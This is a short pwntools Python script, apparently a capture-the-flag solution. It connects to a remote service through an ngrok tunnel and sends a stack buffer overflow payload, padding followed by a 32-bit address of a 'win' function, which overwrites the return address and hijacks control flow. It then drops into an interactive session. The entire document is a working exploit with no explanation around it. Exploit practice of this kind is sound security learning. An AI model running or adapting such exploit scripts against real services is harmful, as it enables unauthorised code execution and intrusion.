from pwn import *
p = remote("2.tcp.ngrok.io",14881)
#p = process('./vd2')

#gdb.attach('vd2')
win_address = 0x80484D6

payload = "A"*0x18 + "AAAA" + p32(win_address)  

p.sendline(payload)
p.interactive()
